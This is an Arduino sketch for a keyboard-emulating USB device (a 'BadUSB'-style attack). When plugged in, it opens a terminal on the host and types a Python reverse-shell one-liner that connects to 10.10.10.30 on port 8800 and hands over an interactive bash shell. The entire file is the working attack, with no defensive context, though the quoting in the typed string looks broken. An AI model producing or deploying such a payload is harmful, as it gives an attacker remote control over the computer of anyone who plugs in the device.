#include <Keyboard.h>

void setup() {
  // put your setup code here, to run once:
  Keyboard.begin();
  delay(2000);
/*
  Keyboard.press(KEY_LEFT_CTRL);
  delay(500);
  Keyboard.press(KEY_LEFT_ALT);
  delay(500);
  Keyboard.press('T');
  delay(500);
  Keyboard.release('T');
  */
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.release(KEY_LEFT_GUI);
  delay(500);
  Keyboard.println("term");
  delay(500);

  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.release(KEY_RETURN);


  Keyboard.println("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.30\",8800));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.release(KEY_RETURN);
  delay(50);




}

void loop() {
  // put your main code here, to run repeatedly:

}